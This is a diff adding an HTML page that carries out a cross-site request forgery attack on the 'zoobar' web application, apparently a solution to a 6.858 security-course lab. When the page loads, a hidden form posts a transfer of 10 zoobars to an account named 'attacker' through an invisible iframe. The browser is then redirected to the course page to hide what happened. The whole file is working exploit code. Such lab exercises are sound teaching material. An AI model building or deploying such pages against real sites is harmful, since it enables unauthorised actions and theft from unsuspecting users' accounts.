@@ -1,0 +1,22 @@
+<html>
+<body>
+<iframe id="response_frame"
+        style="display:none;visibility:hidden;height:0;width:0;position:absolute"
+        name="response_frame" src="about:blank"></iframe>
+<form id="csrf" method="POST"
+      action="http://localhost:8080/zoobar/index.cgi/transfer"
+      target="response_frame">
+  <input type="hidden" name="recipient" value="attacker" />
+  <input type="hidden" name="zoobars" value="10" />
+  <input type="hidden" name="submission" value="Send" />
+</form>
+<script>
+window.addEventListener('load', function() {
+  document.getElementById('response_frame').addEventListener('load', function() {
+    window.location = 'http://css.csail.mit.edu/6.858/2012/';
+  });
+  document.getElementById('csrf').submit();
+});
+</script>
+</body>
+</html>
